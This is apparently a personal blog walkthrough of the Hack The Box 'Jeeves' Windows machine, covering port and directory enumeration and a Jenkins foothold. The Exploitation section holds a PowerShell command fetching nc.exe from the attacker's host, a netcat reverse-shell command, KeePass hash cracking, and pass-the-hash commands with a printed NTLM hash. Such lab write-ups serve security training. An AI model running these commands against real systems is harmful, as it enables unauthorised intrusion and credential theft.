---
title: "Jeeves Walkthrough(Hack The Box)"
date: 2025-04-07
draft: false
description: "a description"
tags: ["Medium", "Windows", "Hack The Box", "Hacking", "Active Directory", "Walkthrough"]
lastmod: 2025-04-07
---
## Reconnaissance #Windows 
- We got port 135, 80, 445 open on the machine. Nmap scan reveals these
![Pasted image 20241215194409.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241215194409.png?raw=true)
- On port 80 we got a web application running with a search option for articles :That was my initial impression
- Its running on windows 10 and the search option leads to an error page, surprisingly. Also it's a SQL error.
![Pasted image 20241215145119.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241215145119.png?raw=true)
- From the error page I can see get the server info
![Pasted image 20241215145414.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241215145414.png?raw=true)
- I tried all the things from directory to host enumeration it all failed . The reason is I overlooked a port which is 50000. This port is also had a web page on it.
![overlooked](https://media3.giphy.com/media/v1.Y2lkPTc5MGI3NjExanBwOGhzZXVkOGE3OGc2OW9rMTVwNTJpcmN3eWxiNGM1eWlxcDQ3NyZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/99s3muxpBpgZqrz9Bk/giphy.gif)

## Enumeration
- On fuzzing the directories I get a hit 
```bash
 ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://jeeves.htb:50000/FUZZ -t 60
```
![Pasted image 20241215194726.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241215194726.png?raw=true)
- After accessing the directory I was so happy to see jenkins. Then I got access easily by injecting this following command to download nc from my my machine on the project build page.
{{< alert icon="circle-info" >}} I have exploited jenkins multiple times in THM and HTB, It's relatively easy to leverage jenkins for a foothold  {{< /alert >}}

## Exploitation
 ```powershell
 powershell -c "Invoke-WebRequest -Uri 'http://10.10.14.4:8000/nc.exe' -OutFile 'C:\Windows\Temp\good.exe'"
```
- Executed it using next build command 

```cmd
C:\\Windows\Temp\good.exe <ip> <port> -e cmd.executing
```
- Soon after getting user flag I tried this `whoami /priv` and saw seimpersonate set enabled and tried some of the attacks from metasploit but failed.
- Initially to transfer this shell to meterpreter I used `exploit/multi/script/web_discovery` for the payload `windows/meterpreter/reverse_tcp` cause x64 was not working.
- This above module helped me to create a meterpreter shell by presenting a command to paste in the shell session I had.
- Soon after executing the command I got meterpreter access.
- As I didn't had any luck with potato attacks. I decided to check other directories and found a file in the Documents folder for this user. Which was `CEH.kdbd`.
- which is a keepass db file so typically this requires master key to unlock it.
- I used  john to generate hash and then hashcat to crack it.
```bash
keepass2john CEH.kdbd >> kdbd.hash
```
- Then cracked the generated hash using hashcat
```bash
hashcat kdbd.hash  /usr/share/wordlists/rockyou.txt --user -m 13400
```
- I used `--user` flag as hash had a username `CEH`.
- I got the password which is `<Redacted>`
![Pasted image 20241215201728.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241215201728.png?raw=true)
- I opened the db using `kpcli --kdb CEH.kdbx` and provided master password when it prompted
![password](https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExZ2EzZGxhaHBmeXgyOTBwZnM4NDRxOG5ieWdwMXY2ejQ0azd5dzBzaSZlcD12MV9naWZzX3NlYXJjaCZjdD1n/UaknrN00ViA8GiqfMV/giphy.gif)
- Only a password hash seemed interesting to me
![Pasted image 20241215201952.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241215201952.png?raw=true)

## Privilege Escalation
- I checked the hash's sanity as Administrator to machine's share using crackmapexec and it was a success
```bash
crackmapexec smb 10.10.10.63 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
```
![Pasted image 20241215202113.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241215202113.png?raw=true)
- Now using psexec.py I initiated pass the hash attack to get a shell
- `psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 administrator@10.10.10.63 cmd.exe`
![Pasted image 20241215202422.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241215202422.png?raw=true)
- Administrator's Desktop folder had this `hm.txt` which said to look elsewhere for the root flag but by issuing `dir /R` I got to see the alternate data streams for the files.
![elsewhere](https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExNmFuamdjbW42Y2YwOGc4NTN6amc4aDN4ZjdjOHVjdXZqMTljZjd0MSZlcD12MV9naWZzX3NlYXJjaCZjdD1n/YQAKKoou2jpBf0e9Cj/giphy.gif)
![Pasted image 20241215202656.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241215202656.png?raw=true)
- To read the contents of the root flag I typed `more < hm.txt:root.txt`
![Pasted image 20241215202910.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241215202910.png?raw=true)

{{< typeit >}} This box is one of the initial boxes that I pwned in Hack The Box. Boxes like this made me to love AD. As always see you again ;) {{< /typeit >}}

![bye](https://media.giphy.com/media/YryOxqFsFTjWg/giphy.gif?cid=790b76115cfty741txbxw52miz2en646ne5gpnrb7fwalfrf&ep=v1_gifs_search&rid=giphy.gif&ct=g)
